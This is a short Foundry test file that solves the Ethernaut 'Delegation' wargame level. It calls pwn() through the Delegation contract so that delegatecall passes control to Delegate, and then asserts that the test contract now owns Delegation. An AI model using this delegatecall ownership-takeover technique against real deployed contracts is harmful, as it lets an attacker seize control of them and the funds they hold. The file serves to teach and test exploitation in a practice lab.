// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import { Delegation, Delegate } from "ethernaut/L5.delegation.sol";

contract DelegationCrackerTest is Test {
  Delegation internal delegation;

  function setUp() external {
    delegation = new Delegation(address(new Delegate(address(0))));
  }

  function testDelegationCracker() external {
    Delegate(address(delegation)).pwn();

    assertEq(delegation.owner(), address(this));
  }
}
